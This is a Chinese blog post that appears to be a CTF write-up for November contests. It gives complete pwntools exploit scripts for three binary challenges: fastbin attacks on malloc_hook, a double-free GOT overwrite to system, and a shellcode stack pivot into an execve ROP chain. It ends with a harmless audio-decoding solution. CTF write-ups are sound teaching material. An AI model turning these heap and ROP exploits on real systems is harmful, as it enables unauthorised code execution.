---
layout: post
title:  "十一月CTF部分题目汇总一"
categories: ctf
tags: ctf
author: ble55ing
---

* content
{:toc}
## 十一月CTF部分题目汇总

湖湘杯和红帽杯的比赛题目，把做的中比较有意思的记录一下

### 湖湘杯

#### pwn1 HackNote

静态编译的堆题。。好复杂。但大段大段的任意地址写。

没开PIE，但堆地址和栈地址是随机的

一开始是可以unlink的，改malloc到shellcode就行了。后来主办方更新了附件，unlink不了了

不过我一开始就没想用unlink做，所以受的影响不大（哈哈）

我的方法是使用两次fastbin attack，一次去改malloc_hook，一次去往固定地址写shellcode。

```
from pwn import *
context.arch="amd64"

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")


def add(size,content):
    p.sendlineafter("-----------------","1")
    p.sendlineafter("Size:",str(size))
    p.sendafter("Note:",content)

def delete(idx):
    p.sendlineafter("-----------------","2")
    p.sendlineafter("Note:",str(idx))

def edit(idx,content):
    p.sendlineafter("-----------------","3")
    p.sendlineafter("Note:",str(idx))
    p.sendafter("Note:",content)

def exploit():

	add(0x18,"0"*0x18+"\n")
	add(0x18,"1"*0x18+"\n")
	add(0x38,"2"*0x18+"\n")
	edit(0,"a"*0x18+"\n")
	edit(0,"a"*0x18+'\x61'+"\n")
	delete(1)
	add(0x58,"3"*0x18+p64(0x41)+"b"*0x38+"\n")
	delete(2)
	edit(1,"3"*0x18+p64(0x41)+p64(0x6cb772)+"b"*0x30+"\n")
	add(0x38,"\n")

	add(0x38,"\x00"*6+"\n")#+p64(0x6ca790)+"\n")

	add(0x18,"\n")
	add(0x18,"0"*0x18+"\n")#4
	add(0x68,"\n")#5
	add(0x61,"\n")#6
	edit(4,"a"*0x18+"\n")
	edit(4,"a"*0x18+'\x91'+"\n")
	#
	delete(5)
	add(0x88,"3"*0x18+p64(0x71)+"b"*0x48+"\n")
	delete(4)
	delete(6)
	
	edit(5,"3"*0x18+p64(0x71)+p64(0x6cd63d)+"b"*0x30+"\n")
	
	
	add(0x68,"4444"+"\n")
	add(0x68,"\x00"*3+asm(shellcraft.sh())+"\n")
	#gdb.attach(p)
	edit(3,"\x00"*6+p64(0x6cd648)+'\n')
	p.sendlineafter("-----------------","1")
	p.sendlineafter("Size:",str(55))
	p.interactive()
	

if __name__ == "__main__":
    context.binary = "./HackNote2"
    #context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./HackNote2')
    debug =1
    if debug==1:
        p = remote('183.129.189.62',18004)
        #libc=ELF('./libc-2.27.so')
        exploit()
    else:
        p=process('./HackNote2')#,env={'LD_PRELOAD':'./libc-2.27.so'})
        #libc = ELF('./libc-2.27.so')
        exploit()
```

#### pwn2 NameSystem

程序存在double free。在释放程序的倒数第二个块的时候会将倒数第一个块放过来，但是

每次写入都会在最后补0。尝试一次double free 改free_got位system然后爆破，由于函数中有00所以通不过？函数地址一定不能有00吗。。也不一定吧，反正通不过，一直爆破一直爆破，也就爆不出来。

所以还是尝试3次double free 泄露地址再改system

一次double free改list[0]为puts@got，一次改free@got为puts地址泄露libc，一次改free@got为system get shell。

```
from pwn import *
context.arch="amd64"

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")


def add(size,content):
	p.sendlineafter("choice :","1")
	p.sendlineafter("Size:",str(size))
	p.sendafter("Name:",content)

def delete(idx):
	p.sendlineafter("choice :","3")
	p.sendlineafter("delete:",str(idx))

def exploit():
	try :
		#p = process("./NameSystem")
		p = remote('183.129.189.62',17105)
		for i in range(0,15):
			add(0x18,"/bin/sh;\n")
		for i in range(15,19):
			add(0x50,"0"*0x10+"\n")
		add(0x50,"0"*0x3+"\n")
		delete(18)
		delete(19)
		delete(17)
		delete(17)
		add(0x58,p64(0x601ffa)+"\n")
		add(0x58,"aaaa\n")
		delete(0)
		add(0x58,"aaa"+"\n")
		delete(0)
		
		add(0x58,"\x00"*14+'\x90\x33'+"\n")
		delete(0)
		p.interactive()
	except:
		p.close()
	
if __name__ == "__main__":
    context.binary = "./NameSystem"
    #context.terminal = ['tmux','sp','-h']
    #context.log_level = 'debug'
    elf = ELF('./NameSystem')
    debug =1
    if debug==0:
        p = remote('183.129.189.62',17105)
        #libc=ELF('./libc-2.27.so')
        exploit()
    else:
        #,env={'LD_PRELOAD':'./libc-2.27.so'})
        #libc = ELF('./libc-2.27.so')
        while 1:
        	exploit()
```



### 红帽杯

#### pwn1 three

3字节的写shellcode题。发现ecx就是写入shellcode的地址，只要push ecx再pop esp 就能够将栈劫持到写入位置，进行rop了。

```
#coding:utf-8
from pwn import *

context.log_level='debug'

p=process("./three")#,env={"LD_PRELOAD":"/ctf/work/glibc/2.23-0ubuntu10_amd64/libc.so.6"})
#p=remote('47.104.190.38',12001)
context.arch == "i386"
pebx = 0x080481d9
peax = 0x080c11e6
int80 = 0x08049903
pecx = 0x080ddb65
pedx = 0x08072f8b
leaveret = 0x080487d5 
p.sendlineafter("index:",'0')
p.sendafter("much!","Q\xff!")#asm("push ecx;jmp [ecx]"))
p.sendlineafter("size:","512")

p.recvuntil("me:")
gdb.attach(p)
p.send(p32(0x08054e26)+p32(0)+p32(0)*2+p32(pecx)+p32(0)+p32(pedx)+p32(0)+p32(peax)+p32(11)+p32(pebx)+p32(0x80f6cf4)+p32(int80)+"/bin/sh\x00")
p.interactive()

```

#### misc 玩具车

给一串玩具车的信号，然后绘制玩具车路径找flag的题

从wav中获取电平信号，使用较为精细的提取度对电平信号进行提取，然后使用    Jeach 来调整角速度，即每次转向信号能够转多少度。

```
import wave as we
import numpy as np
import matplotlib.pyplot as plt
from PIL import Image
import math


def wavread(path):
    wavfile = we.open(path, "rb")
    params = wavfile.getparams()
    framesra, frameswav = params[2], params[3]
    datawav = wavfile.readframes(frameswav)
    wavfile.close()
    datause = np.fromstring(datawav, dtype=np.short)
    datause.shape = -1, 2
    datause = datause.T
    time = np.arange(0, frameswav) * (1.0 / framesra)
    return datause, time


def main():
    MAX = 1000
    path1 = r"C:\Users\lenovo\Desktop\carr\L293_1_A1.wav"
    path2 = r"C:\Users\lenovo\Desktop\carr\L293_1_A2.wav"
    path3 = r"C:\Users\lenovo\Desktop\carr\L293_1_B1.wav"
    path4 = r"C:\Users\lenovo\Desktop\carr\L293_1_B2.wav"
    pathE1 = r"C:\Users\lenovo\Desktop\carr\L293_1_EnA.wav"
    pathE2 = r"C:\Users\lenovo\Desktop\carr\L293_1_EnB.wav"
    wavdata1, wavtime1 = wavread(path1)
    wavdata2, wavtime2 = wavread(path2)
    wavdata3, wavtime3 = wavread(path3)
    wavdata4, wavtime4 = wavread(path4)
    wavdataE1, wavtimeE1 = wavread(pathE1)
    wavdataE2, wavtimeE2 = wavread(pathE2)
    #vx = [1,0.7,0,-0.7,-1,-0.7,0,0.7]
    #vy = [0,0.7,1,0.7,0,-0.7,-1,-0.7]
    Jeach = 90/4
    Jnow =0

    prev=-1
    pic = Image.new("RGB", (MAX, MAX))

    for y in range(0, MAX):
        for x in range(0, MAX):
            pic.putpixel([x, y], (0, 0, 0))
    sitx = 500
    sity=50
    situa = []
    vsit = 0
    pic.putpixel([int(sitx), int(sity)], (255,255,255))
    for i in range(3152):
        k= i *1000
        if wavdataE1[0][k] >0:
            if wavdata1[0][k]>0:
                lv=1
            else:
                lv=-1
        else:
            lv=0
        if wavdataE2[0][k] >0:
            if wavdata3[0][k]>0:
                rv=1
            else:
                rv=-1
        else:
            rv=0
        if lv==1 and rv==1:
            sitx += math.sin(math.radians(Jnow))
            sity += math.cos(math.radians(Jnow))
            pic.putpixel([int(sitx), int(sity)], (255, 255, 255))
        elif lv==1 and rv==-1:
            Jnow =(Jeach+Jnow)%360
            #sitx += vx[vsit]
            #sity += vy[vsit]
            #pic.putpixel([int(sitx), int(sity)], (255, 255, 255))
        elif lv == -1 and rv ==1:
            Jnow =(Jnow-Jeach+360)%360
            #sitx += vx[vsit]
            #sity += vy[vsit]
            print sitx,sity
            #pic.putpixel([int(sitx), int(sity)], (255, 255, 255))
        elif lv==-1 and rv==-1:
            sitx -= math.sin(math.radians(Jnow))
            sity -= math.cos(math.radians(Jnow))
            pic.putpixel([int(sitx), int(sity)], (255,255,255))

        if (lv,rv) not in situa:
            situa.append((lv,rv))
    print situa

    pic.save("11.png")


    '''
    plt.title("Night.wav's Frames")
    plt.subplot(211)
    plt.plot(wavtime, wavdata[0], color='green')
    plt.subplot(212)
    plt.plot(wavtime, wavdata[1])
    plt.show()
    '''


main()
```

